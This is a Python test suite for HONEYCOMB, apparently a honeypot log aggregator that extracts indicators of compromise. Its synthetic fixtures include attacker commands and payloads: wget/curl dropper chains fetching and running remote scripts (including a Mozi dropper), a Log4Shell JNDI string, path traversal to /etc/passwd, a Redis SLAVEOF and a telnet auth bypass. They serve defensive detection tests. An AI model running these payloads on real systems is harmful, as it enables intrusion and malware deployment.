"""
HONEYCOMB tests - standard library only.

    python -m unittest discover -s tests -v

Every honeypot adapter gets a one-record fixture in a sensor folder with a neutral name
(sensor_NN), so detection has to work from the records themselves, not from folder hints -
the same situation as a collection script that names folders by code name.

The fixtures are synthetic, written from each project's documented / logged field names.
They prove HONEYCOMB detects and parses those shapes; they are not a substitute for running it
on real logs from each honeypot.
"""

import base64
import contextlib
import hashlib
import importlib.util
import io
import json
import shutil
import tempfile
import unittest
import unittest.mock
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
_spec = importlib.util.spec_from_file_location("honeycomb", ROOT / "honeycomb.py")
hc = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(hc)

TS = "2026-11-01T10:00:00.000000Z"
OWN_IP = "203.0.113.50"          # documentation range, stands in for a sensor's public IP
HL7 = base64.b64encode(b"MSH|^~\\&|ATTACKER|X|Y|Z|20261101||ADT^A01|1|P|2.3\r").decode()


def ed25519_key(seed):
    blob = b"\x00\x00\x00\x0bssh-ed25519\x00\x00\x00\x20" + hashlib.sha256(seed).digest()
    key = "ssh-ed25519 " + base64.b64encode(blob).decode()
    fp = "SHA256:" + base64.b64encode(hashlib.sha256(blob).digest()).decode().rstrip("=")
    return key, fp


KEY_SHARED, FP_SHARED = ed25519_key(b"operator")      # used from two different /24s -> medium
KEY_CLUSTER, FP_CLUSTER = ed25519_key(b"researcher")  # two IPs in one /24 -> stays low


def j(*records):
    return "\n".join(json.dumps(r) for r in records) + "\n"


# (expected honeypot name, file name, content, optional sub-folder that acts as a hint)
FIXTURES = [
    ("cowrie", "cowrie.json", j(
        {"eventid": "cowrie.session.connect", "timestamp": TS, "src_ip": "45.9.20.1", "src_port": 4000,
         "dst_ip": OWN_IP, "dst_port": 22, "session": "s1", "protocol": "ssh"},
        {"eventid": "cowrie.login.failed", "timestamp": TS, "src_ip": "45.9.20.1", "session": "s1",
         "username": "root", "password": "=1234"},
        {"eventid": "cowrie.login.success", "timestamp": TS, "src_ip": "45.9.20.1", "session": "s1",
         "username": "root", "password": "admin"},
        {"eventid": "cowrie.command.input", "timestamp": TS, "src_ip": "45.9.20.1", "session": "s1",
         "input": "cd /tmp; wget http://198.51.7.9/x.sh; curl ipinfo.io; wget http://%s/back" % OWN_IP},
        {"eventid": "cowrie.client.kex", "timestamp": TS, "src_ip": "45.9.20.1", "session": "s1",
         "hassh": "0a07365cc01fa9fc82608ba4019af499"},
        # logs in and does nothing else - the typical Cowrie bot
        {"eventid": "cowrie.login.success", "timestamp": TS, "src_ip": "45.9.20.2", "session": "s2",
         "username": "root", "password": "123456"},
        # downloads by domain, with || fallbacks, a query string, and a URL that is only echoed
        {"eventid": "cowrie.command.input", "timestamp": TS, "src_ip": "45.9.20.3", "session": "s3",
         "input": "cd /tmp || cd /; wget http://dl.example-bot.net/main_arm -O a || curl -O "
                  "http://dl.example-bot.net/main_x86; wget http://dl.example-bot.net/get?a=1&b=2 -O c; "
                  "echo http://docs.sample-site.net/readme"},
        {"eventid": "cowrie.client.fingerprint", "timestamp": TS, "src_ip": "45.9.20.4", "session": "s4",
         "username": "admin", "key": KEY_SHARED, "type": "ssh-ed25519", "fingerprint": "aa:bb"},
        {"eventid": "cowrie.client.fingerprint", "timestamp": TS, "src_ip": "46.10.1.1", "session": "s5",
         "username": "admin", "key": KEY_SHARED, "type": "ssh-ed25519", "fingerprint": "aa:bb"},
        {"eventid": "cowrie.client.fingerprint", "timestamp": TS, "src_ip": "139.19.117.10", "session": "s6",
         "username": "admin", "key": KEY_CLUSTER, "type": "ssh-ed25519", "fingerprint": "cc:dd"},
        {"eventid": "cowrie.client.fingerprint", "timestamp": TS, "src_ip": "139.19.117.11", "session": "s7",
         "username": "admin", "key": KEY_CLUSTER, "type": "ssh-ed25519", "fingerprint": "cc:dd"},
        {"eventid": "cowrie.telnet.exploit_attempt", "timestamp": TS, "src_ip": "45.9.21.5", "session": "s8",
         "protocol": "telnet", "cve": "CVE-2026-24061", "name": "USER", "value": "-f root"}),
     None),
    ("conpot", "conpot.json", j(
        {"timestamp": "2026-11-01T10:00:00.123456", "src_ip": "80.82.77.33", "dst_ip": OWN_IP,
         "dst_port": 102, "data_type": "s7comm", "event_type": "NEW_CONNECTION", "id": "c1",
         "request": None}), None),
    ("conpot", "conpot.log",
     "2026-11-01 10:00:00,123 New s7comm session from 80.82.77.34 (c2a1b2c3-0000-4000-8000-000000000001)\n",
     None),
    ("conpot", "conpot.log",  # URL-encoded Mozi dropper in an HTTP request
     "2026-11-01 10:00:00,123 HTTP/1.1 GET request from ('1.1.1.50', 49008): ('/setup.cgi?next_file=netgear.cfg"
     "&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://198.51.7.40:50285/Mozi.m+-O+/tmp/netgear;sh+netgear"
     "&curpath=/&currentsetting.htm=1', 'HTTP/1.1'). 3f6e6a1c-0000-4000-8000-000000000002\n", None),
    ("medpot", "medpot.log", j(  # upstream MedPot format
        {"level": "info", "message": "Connection found", "time": "2026.11.01 10:00:00", "port": "57905",
         "ip": "185.220.1.2", "data": ""},
        {"level": "info", "message": "Data received", "time": "2026.11.01 10:00:01", "port": "57905",
         "ip": "185.220.1.2", "data": HL7}), None),
    ("medpot", "medpot.log", j(  # T-Pot style (has time + src_ip, the shape DDoSPot used to steal)
        {"level": "info", "message": "Connection found", "time": TS, "src_ip": "185.220.1.3",
         "dest_port": 2575, "data": HL7}), None),
    ("adbhoney", "adbhoney.json", j(
        {"eventid": "adbhoney.session.connect", "timestamp": TS, "src_ip": "1.1.1.10", "session": "a"},
        {"eventid": "adbhoney.command.input", "timestamp": TS, "src_ip": "1.1.1.10", "session": "a",
         "input": "busybox wget http://198.51.7.10/a.arm7"}), None),
    ("beelzebub", "beelzebub.json", j(
        {"level": "info", "msg": "New Event", "event": {
            "DateTime": TS, "RemoteAddr": "1.1.1.11:5555", "SourceIp": "1.1.1.11", "Protocol": "SSH",
            "Msg": "New SSH attempt", "User": "root", "Password": "toor", "SessionID": "b1"}}), None),
    ("ciscoasa", "ciscoasa.log",
     "{'timestamp': '%s', 'src_ip': '1.1.1.12', 'payload_printable': 'GET /+CSCOE+/logon.html'}\n" % TS,
     None),
    ("citrixhoneypot", "server.log", j(
        {"asctime": "2026-11-01 10:00:00,123", "levelname": "WARNING",
         "message": "(1.1.1.13:40000): GET /vpns/../vpns/cfg/smb.conf"}), None),
    ("ddospot", "dns.log", j(
        {"time": TS, "src_ip": "1.1.1.14", "src_port": 53, "dns_name": "example.org"}), "ddospot"),
    ("dicompot", "dicompot.log", j(
        {"time": TS, "IP": "1.1.1.15", "Port": "40000", "ID": 7, "Command": "C-ECHO", "AETitle": "SCANNER"}),
     None),
    ("dionaea", "dionaea.json", j(
        {"timestamp": TS, "src_ip": "1.1.1.16", "dst_ip": OWN_IP, "dst_port": 445,
         "connection": {"protocol": "smbd", "transport": "tcp"}}), None),
    ("elasticpot", "elasticpot.json", j(
        {"eventid": "elasticpot.recon", "timestamp": TS, "src_ip": "1.1.1.17", "request": "GET", "url": "/"}),
     None),
    ("endlessh", "endlessh.log",
     "2026-11-01T10:00:00.000Z ACCEPT host=1.1.1.18 port=40000 fd=4 n=1/4096\n"
     "2026-11-01T10:05:00.000Z CLOSE host=1.1.1.18 port=40000 fd=4 time=300.000 bytes=1234\n", None),
    ("galah", "galah.json", j(
        {"time": TS, "srcIP": "1.1.1.19", "msg": "successfulResponse",
         "httpRequest": {"method": "GET", "request": "/.env", "sessionID": "g1"}}), None),
    ("glutton", "glutton.log", j(
        {"ts": 1793527200.5, "src_ip": "1.1.1.20", "src_port": 40000, "handler": "tcp",
         "payload_hex": "474554202f20485454502f312e300d0a"}), None),
    ("go-pot", "gopot.json", j(
        {"time": TS, "id": "gp1", "phase": "start", "src_ip": "1.1.1.21", "method": "GET", "path": "/.git/config"}),
     None),
    ("h0neytr4p", "log.json", j(
        {"timestamp": TS, "src_ip": "1.1.1.22", "trapped": "true", "trapped_for": "CVE-2021-41773",
         "method": "GET", "path": "/cgi-bin/.%2e/.%2e/etc/passwd"}), None),
    ("hellpot", "hellpot.log", j(
        {"time": TS, "REMOTE_ADDR": "1.1.1.23", "URL": "/wp-login.php", "USERAGENT": "zgrab", "message": "NEW"}),
     None),
    ("heralding", "auth.csv",
     "timestamp,auth_id,session_id,source_ip,source_port,destination_ip,destination_port,protocol,"
     "username,password,password_hash\n"
     "2026-11-01 10:00:00.123456,a1,h1,1.1.1.24,40000,%s,21,ftp,admin,admin,\n" % OWN_IP, None),
    ("heralding", "session.json", j(
        {"timestamp": TS, "source_ip": "1.1.1.25", "session_id": "h2", "protocol": "pop3",
         "num_auth_attempts": 1, "auth_attempts": [{"username": "bob", "password": "hunter2"}]}), None),
    ("honeyaml", "honeyaml.log", j(
        {"time": TS, "src_ip": "1.1.1.26", "method": "GET", "path": "/api/users", "path_type": "static",
         "status_code": 200}), None),
    ("honeypots", "honeypots.log", j(
        {"timestamp": TS, "src_ip": "1.1.1.27", "server": "ftp_server", "action": "login",
         "username": "anonymous", "password": "x", "status": "failed"}), None),
    ("honeytrap", "attackers.json", j(
        {"timestamp": TS, "attack_connection": {"remote_ip": "1.1.1.28", "local_ip": OWN_IP, "local_port": 8081,
                                                "protocol": "tcp", "payload": {"data_hex": "474554202f"}}}), None),
    ("ipphoney", "ipphoney.json", j(
        {"eventid": "ipphoney.connect", "timestamp": TS, "src_ip": "1.1.1.29", "request": "POST", "url": "/ipp"}),
     None),
    ("log4pot", "log4pot.log", j(
        {"timestamp": TS, "reason": "exploit", "client": "1.1.1.30", "server_port": 8080,
         "payload": "${jndi:ldap://198.51.7.30:1389/a}", "deobfuscated_payload": "${jndi:ldap://198.51.7.30:1389/a}"}),
     None),
    ("mailoney", "commands.log", j(
        {"timestamp": TS, "src_ip": "1.1.1.31", "src_port": 40000, "data": "EHLO scanner"}), None),
    ("miniprint", "miniprint.json", j(
        {"timestamp": TS, "src_ip": "1.1.1.32", "event": "print_job", "action": "job", "job_text": "hello"}), None),
    ("rdphoneypot", "rdp.json", j(
        {"eventid": "rdphoneypot.connect", "timestamp": TS, "src_ip": "1.1.1.33", "session": "r1"}), None),
    ("redishoneypot", "redis.log", j(
        {"time": TS, "addr": "1.1.1.34:40000", "action": "NewConnect"},
        {"time": TS, "addr": "1.1.1.34:40000", "action": "SLAVEOF", "host": "198.51.7.34", "port": "6379"}), None),
    ("sentrypeer", "sentrypeer.json", j(
        {"event_timestamp": TS, "source_ip": "1.1.1.35", "event_uuid": "u1", "sip_method": "OPTIONS",
         "sip_user_agent": "friendly-scanner", "called_number": "100"}), None),
    ("tanner", "tanner_report.json", j(
        {"timestamp": TS, "peer": {"ip": "1.1.1.36", "port": 40000}, "path": "/index.php?id=1'", "method": "GET",
         "uuid": "t1", "response_msg": {"response": {"message": {"detection": {"name": "sqli"}}}}}), None),
    ("wordpot", "wordpot.log", j(
        {"timestamp": TS, "src_ip": "1.1.1.37", "url": "/wp-login.php", "plugin": "login",
         "username": "admin", "password": "admin"}), None),
]


def build(root):
    """Write every fixture into root/sensor_NN[/hint]/file. Returns {folder: expected hp}."""
    expected = {}
    for n, (hp, fname, content, hint) in enumerate(FIXTURES):
        d = root / ("sensor_%02d" % n)
        if hint:
            d = d / hint
        d.mkdir(parents=True)
        (d / fname).write_text(content, encoding="utf-8")
        expected["sensor_%02d" % n] = hp
    return expected


def run(argv):
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(io.StringIO()):
        code = hc.main(argv)
    return code, buf.getvalue()


class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="honeycomb-test-"))
        self.logs = self.tmp / "logs"
        self.logs.mkdir()
        self.expected = build(self.logs)
        self.out = self.tmp / "out"

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def main(self, *extra):
        return run([str(self.logs), "--out", str(self.out), "--no-banner", "--no-state", "--no-geo"] + list(extra))

    def iocs(self):
        return json.loads((self.out / "iocs" / "master_iocs.json").read_text(encoding="utf-8"))["iocs"]


class Detection(Base):
    def test_every_adapter_is_detected_without_folder_hints(self):
        sensors = hc.discover(self.logs, {})
        got = {s["id"]: s["kinds"] for s in sensors}
        for folder, hp in self.expected.items():
            with self.subTest(folder=folder, honeypot=hp):
                self.assertEqual(got.get(folder), [hp])

    def test_all_adapters_have_a_fixture(self):
        covered = {hp for hp, *_ in FIXTURES}
        names = {a.hp for a in hc.ADAPTERS.values() if a.name != "generic"}
        self.assertEqual(names - covered, set())

    def test_ddospot_needs_a_hint(self):
        rec = {"time": TS, "src_ip": "1.1.1.14", "dns_name": "example.org"}
        self.assertNotEqual(hc._json_kind(rec, None), "ddospot")
        self.assertEqual(hc._json_kind(rec, "ddospot"), "ddospot")


class Parsing(unittest.TestCase):
    def test_timestamps(self):
        cases = {
            "2018.09.09 17:20:49": "2018-09-09T17:20:49Z",            # MedPot
            "2026-11-07T10:00:00.12+0530": "2026-11-07T04:30:00Z",     # odd fraction + compact offset
            "2026-11-07T10:00:00+00:00Z": "2026-11-07T10:00:00Z",      # RDP honeypot / IPPHoney
            "2026-11-07 10:00:00,123": "2026-11-07T10:00:00Z",         # Python logging asctime
            "2026-11-07T10:00:00.1234567Z": "2026-11-07T10:00:00Z",    # 7-digit fraction
        }
        for raw, want in cases.items():
            with self.subTest(raw=raw):
                self.assertEqual(hc.iso(hc.parse_ts(raw)), want)
        self.assertIsNone(hc.parse_ts("garbage"))
        self.assertIsNone(hc.parse_ts("2026-13-01T00:00:00"))

    def test_clean_ip(self):
        self.assertEqual(hc.clean_ip("::ffff:1.2.3.4"), "1.2.3.4")
        self.assertEqual(hc.clean_ip("1.2.3.4:5060"), "1.2.3.4")
        self.assertEqual(hc.clean_ip("[2001:db8::1]:80"), "2001:db8::1")
        self.assertEqual(hc.clean_ip("not an ip"), "")

    def test_csv_safe(self):
        self.assertEqual(hc.csv_safe("=cmd|' /C calc'!A0"), "'=cmd|' /C calc'!A0")
        self.assertEqual(hc.csv_safe("root"), "root")


class EndToEnd(Base):
    def test_run_and_outputs(self):
        code, log = self.main()
        self.assertEqual(code, 0, log)
        for f in ("dashboard.html", "credentials.csv", "credentials.jsonl", "iocs/master_iocs.csv",
                  "iocs/master_iocs.json", "iocs/stix2_bundle.json", "iocs/ipv4.txt", "iocs/urls.txt"):
            self.assertTrue((self.out / f).is_file(), f)

    def test_ioc_filtering(self):
        self.main()
        by = {(i["type"], i["value"]): i for i in self.iocs()}
        self.assertIn(("url", "http://198.51.7.9/x.sh"), by)
        self.assertIn(("ipv4", "198.51.7.9"), by)                       # payload host
        self.assertNotIn(("ipv4", OWN_IP), by)                          # our own sensor
        self.assertFalse(any(OWN_IP in v for _, v in by))               # not even inside a URL
        self.assertFalse(any("ipinfo.io" in v for _, v in by))          # benign lookup service
        self.assertIn("login-success", by[("ipv4", "45.9.20.1")]["tags"])

    def test_medpot_attackers_are_shareable(self):
        self.main()
        by = {i["value"]: i for i in self.iocs() if i["type"] == "ipv4"}
        for ip in ("185.220.1.2", "185.220.1.3"):
            with self.subTest(ip=ip):
                self.assertIn(ip, by)
                self.assertIn("medical-scan", by[ip]["tags"])
                self.assertNotIn("possibly-spoofed", by[ip]["tags"])

    def test_ddospot_sources_held_back(self):
        self.main()
        self.assertNotIn("1.1.1.14", {i["value"] for i in self.iocs()})

    def test_credentials_exact_in_jsonl_escaped_in_csv(self):
        self.main()
        rows = [json.loads(l) for l in (self.out / "credentials.jsonl").read_text(encoding="utf-8").splitlines()]
        self.assertIn("=1234", {r["password"] for r in rows})
        self.assertIn("'=1234", (self.out / "credentials.csv").read_text(encoding="utf-8"))

    def test_stix_bundle(self):
        self.main()
        b = json.loads((self.out / "iocs" / "stix2_bundle.json").read_text(encoding="utf-8"))
        self.assertEqual(b["type"], "bundle")
        ids = [o["id"] for o in b["objects"]]
        self.assertEqual(len(ids), len(set(ids)), "duplicate STIX ids")
        known = set(ids)
        for o in b["objects"]:
            if o["type"] == "indicator":
                self.assertTrue(o["pattern"].startswith("[") and o["pattern"].endswith("]"))
                self.assertRegex(o["created"], r"^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d\.\d{3}Z$")
                self.assertGreater(o["valid_until"], o["valid_from"])
            if o["type"] == "relationship":
                self.assertIn(o["source_ref"], known)
                self.assertIn(o["target_ref"], known)

    def test_stix_ids_stable_across_runs(self):
        self.main()
        a = {o["id"] for o in json.loads((self.out / "iocs" / "stix2_bundle.json").read_text())["objects"]
             if o["type"] == "indicator"}
        self.main()
        b = {o["id"] for o in json.loads((self.out / "iocs" / "stix2_bundle.json").read_text())["objects"]
             if o["type"] == "indicator"}
        self.assertEqual(a, b)

    def test_public_dashboard_leaks_nothing(self):
        self.main("--public", "--anonymize-sensors")
        html = (self.out / "dashboard.html").read_text(encoding="utf-8")
        self.assertNotIn(OWN_IP, html)
        self.assertNotIn("sensor_00", html)
        self.assertNotIn(str(self.logs), html)

    def test_since_drops_untimestamped_and_old_events(self):
        code, log = self.main("--since", "2026-11-02")
        self.assertEqual(code, 0)
        self.assertEqual(self.iocs(), [])

    def test_duplicate_rotated_copy(self):
        src = self.logs / "sensor_00" / "cowrie.json"
        shutil.copy(src, src.with_name("cowrie.json.2026-11-01"))
        code, log = self.main()
        self.assertRegex(log, r"[1-9]\d* duplicate lines")

    def test_dashboard_escapes_html(self):
        (self.logs / "sensor_00" / "cowrie.json").write_text(j(
            {"eventid": "cowrie.command.input", "timestamp": TS, "src_ip": "45.9.20.1", "session": "s9",
             "input": "</script><script>alert(1)</script>"}), encoding="utf-8")
        self.main()
        html = (self.out / "dashboard.html").read_text(encoding="utf-8")
        self.assertNotIn("<script>alert(1)", html)


class Release131(Base):
    def test_url_encoded_payload_is_decoded(self):
        self.main()
        urls = {i["value"] for i in self.iocs() if i["type"] == "url"}
        self.assertIn("http://198.51.7.40:50285/Mozi.m", urls)
        self.assertFalse(any("+-O+" in u or "%2" in u for u in urls), urls)

    def test_login_alone_is_medium_commands_are_high(self):
        self.main()
        by = {i["value"]: i for i in self.iocs() if i["type"] == "ipv4"}
        self.assertEqual(by["45.9.20.2"]["confidence"], "medium")
        self.assertEqual(by["45.9.20.1"]["confidence"], "high")

    def test_hassh_is_always_low(self):
        # the same client seen on two sensors used to be bumped to medium by "multi-sensor"
        twin = self.logs / "sensor_99"
        twin.mkdir()
        shutil.copy(self.logs / "sensor_00" / "cowrie.json", twin / "cowrie.json")
        self.main()
        h = [i for i in self.iocs() if i["type"] == "hassh"]
        self.assertTrue(h)
        for i in h:
            self.assertIn("multi-sensor", i["tags"])
            self.assertEqual(i["confidence"], "low")

    def test_scanner_file_holds_ips_back(self):
        f = self.tmp / "scanners.txt"
        f.write_text("# test list\n45.9.20.0/24   # pretend scanner\nnot-an-ip\n", encoding="utf-8")
        code, log = self.main("--scanners", str(f))
        self.assertIn("unreadable lines ignored", log)
        values = {i["value"] for i in self.iocs()}
        self.assertNotIn("45.9.20.1", values)
        self.assertNotIn("45.9.20.2", values)
        self.assertIn("80.82.77.33", values)
        code, log = self.main("--scanners", str(f), "--keep-research-scanners")
        self.assertIn("45.9.20.1", {i["value"] for i in self.iocs()})

    def test_scanners_in_sensors_json(self):
        (self.logs / "sensors.json").write_text(json.dumps({"scanners": ["80.82.77.0/24"]}), encoding="utf-8")
        self.main()
        values = {i["value"] for i in self.iocs()}
        self.assertNotIn("80.82.77.33", values)
        self.assertIn("45.9.20.1", values)

    def test_bundled_scanner_list(self):
        sl = hc.ScannerList()
        sl.load((ROOT / "scanners.txt").read_text(encoding="utf-8").splitlines(), "scanners.txt")
        self.assertEqual(sl.bad, 0)
        self.assertGreater(sl.count, 10)
        for ip in ("198.235.24.15", "205.210.31.200", "147.185.133.1", "65.49.1.80", "2604:a940:300:5b6::1"):
            self.assertTrue(sl.contains(ip), ip)
        for ip in ("8.8.8.8", "45.9.20.1", "2001:db8::1", "garbage"):
            self.assertFalse(sl.contains(ip), ip)


class Release132(Base):
    def test_exploit_request_urls_are_payloads(self):
        # the Conpot text fixture carries "wget+http://198.51.7.40:50285/Mozi.m+-O+/tmp/netgear;sh+netgear"
        self.main()
        by = {(i["type"], i["value"]): i for i in self.iocs()}
        url = by[("url", "http://198.51.7.40:50285/Mozi.m")]
        self.assertIn("exploit-payload", url["tags"])
        self.assertIn("raw-ip-host", url["tags"])
        self.assertEqual(url["confidence"], "high")
        self.assertEqual(url["attack"], ["T1190", "T1105"])
        self.assertIn("payload-host", by[("ipv4", "198.51.7.40")]["tags"])
        self.assertIn("exploit-attempt", by[("ipv4", "1.1.1.50")]["tags"])

    def test_exploit_payload_domain_is_payload_host(self):
        # percent-encoded, JSON Conpot log, domain host
        (self.logs / "sensor_01" / "conpot.json").write_text(j(
            {"timestamp": TS, "src_ip": "80.82.77.35", "dst_port": 80, "data_type": "http", "id": "c9",
             "event_type": None, "request": "GET /cgi-bin/x?cmd=cd%20/tmp%3Bwget%20http%3A%2F%2Fdrop.example-bot.net"
                                            "%2FSakura.sh%3Bsh%20Sakura.sh"}), encoding="utf-8")
        self.main()
        by = {(i["type"], i["value"]): i for i in self.iocs()}
        self.assertEqual(by[("url", "http://drop.example-bot.net/Sakura.sh")]["confidence"], "high")
        dom = by[("domain", "drop.example-bot.net")]
        self.assertIn("payload-host", dom["tags"])
        self.assertNotIn("referenced-host", dom["tags"])
        self.assertIn("exploit-attempt", by[("ipv4", "80.82.77.35")]["tags"])

    def test_plain_request_url_stays_medium(self):
        (self.logs / "sensor_01" / "conpot.json").write_text(j(
            {"timestamp": TS, "src_ip": "80.82.77.36", "dst_port": 80, "data_type": "http", "id": "c10",
             "event_type": None, "request": "GET /proxy?u=http://example-target.net/page HTTP/1.1"}), encoding="utf-8")
        self.main()
        by = {(i["type"], i["value"]): i for i in self.iocs()}
        url = by[("url", "http://example-target.net/page")]
        self.assertEqual(url["confidence"], "medium")
        self.assertNotIn("exploit-payload", url["tags"])


class Release133(Base):
    def test_urls_in_download_commands_are_payloads(self):
        self.main()
        by = {(i["type"], i["value"]): i for i in self.iocs()}
        for u in ("http://dl.example-bot.net/main_arm", "http://dl.example-bot.net/main_x86",
                  "http://dl.example-bot.net/get?a=1&b=2"):
            with self.subTest(url=u):
                self.assertIn(("url", u), by)
                self.assertIn("download-url", by[("url", u)]["tags"])
                self.assertEqual(by[("url", u)]["confidence"], "high")
        self.assertIn("payload-host", by[("domain", "dl.example-bot.net")]["tags"])
        echoed = by[("url", "http://docs.sample-site.net/readme")]
        self.assertNotIn("download-url", echoed["tags"])
        self.assertEqual(echoed["confidence"], "medium")
        self.assertIn("referenced-host", by[("domain", "docs.sample-site.net")]["tags"])

    def test_ssh_keys(self):
        self.assertEqual(hc.ssh_key_fingerprint(KEY_SHARED), FP_SHARED)
        self.assertEqual(hc.ssh_key_fingerprint("ssh-rsa not-base64!"), "")
        self.main()
        by = {i["value"]: i for i in self.iocs() if i["type"] == "ssh-key"}
        self.assertEqual(by[FP_SHARED]["confidence"], "medium")
        self.assertIn("multi-source", by[FP_SHARED]["tags"])
        self.assertEqual(by[FP_CLUSTER]["confidence"], "low")
        self.assertNotIn("multi-source", by[FP_CLUSTER]["tags"])
        keys = (self.out / "iocs" / "ssh_keys.txt").read_text(encoding="utf-8").split()
        self.assertEqual(set(keys), {FP_SHARED, FP_CLUSTER})
        stix = (self.out / "iocs" / "stix2_bundle.json").read_text(encoding="utf-8")
        self.assertNotIn(FP_SHARED, stix)  # no standard STIX observable for SSH keys

    def test_telnet_exploit_attempt(self):
        self.main()
        ip = {i["value"]: i for i in self.iocs()}["45.9.21.5"]
        self.assertIn("exploit-attempt", ip["tags"])
        self.assertIn("cve-2026-24061", ip["tags"])
        self.assertEqual(ip["confidence"], "high")
        self.assertIn("T1190", ip["attack"])

    def test_one_default_state_file_for_every_root(self):
        self.assertEqual(hc.default_state_path(Path("/a/1113_2058")), hc.default_state_path(Path("/a/1113_2155")))
        self.assertEqual(hc.default_state_path().name, "state.json")
        home = self.tmp / "home"
        second = self.tmp / "pull2"
        shutil.copytree(self.logs, second)
        with unittest.mock.patch.object(hc.Path, "home", return_value=home):
            run([str(self.logs), "--out", str(self.out), "--no-banner", "--no-geo"])
            first = {o["id"]: o["created"] for o in json.loads((self.out / "iocs" / "stix2_bundle.json")
                     .read_text())["objects"] if o["type"] == "indicator"}
            run([str(second), "--out", str(self.out), "--no-banner", "--no-geo"])
            again = {o["id"]: o["created"] for o in json.loads((self.out / "iocs" / "stix2_bundle.json")
                     .read_text())["objects"] if o["type"] == "indicator"}
        self.assertEqual(first, again)  # a new pull folder continues the same feed
        self.assertEqual([p.name for p in (home / ".honeycomb").iterdir()], ["state.json"])


class Release134(Base):
    def _twin(self, folder):
        twin = self.logs / (folder + "_twin")
        shutil.copytree(self.logs / folder, twin)

    def test_scanner_on_several_sensors_stays_low(self):
        self._twin(next(f for f, hp in self.expected.items() if hp == "dionaea"))  # 1.1.1.16 only connects
        self.main()
        ip = {i["value"]: i for i in self.iocs()}["1.1.1.16"]
        self.assertIn("multi-sensor", ip["tags"])
        self.assertIn("scanner", ip["tags"])
        self.assertEqual(ip["confidence"], "low")
        code, log = self.main("--min-confidence", "medium")
        self.assertNotIn("1.1.1.16", {i["value"] for i in self.iocs()})

    def test_multi_sensor_still_counts_for_activity(self):
        self._twin("sensor_00")  # Cowrie fixture
        self.main()
        by = {i["value"]: i for i in self.iocs()}
        self.assertEqual(by["45.9.20.2"]["confidence"], "medium")   # login only, on two sensors
        self.assertIn("multi-sensor", by["45.9.20.2"]["tags"])
        self.assertEqual(by["45.9.20.1"]["confidence"], "high")


class StateFile(Base):
    def test_state_keeps_created(self):
        state = self.tmp / "state.json"
        base = [str(self.logs), "--out", str(self.out), "--no-banner", "--no-geo", "--state", str(state)]
        run(base)
        first = {o["id"]: o["created"] for o in json.loads((self.out / "iocs" / "stix2_bundle.json").read_text())
                 ["objects"] if o["type"] == "indicator"}
        run(base)
        second = {o["id"]: o["created"] for o in json.loads((self.out / "iocs" / "stix2_bundle.json").read_text())
                  ["objects"] if o["type"] == "indicator"}
        self.assertEqual(first, second)
        self.assertIn("salt", json.loads(state.read_text()))


if __name__ == "__main__":
    unittest.main()
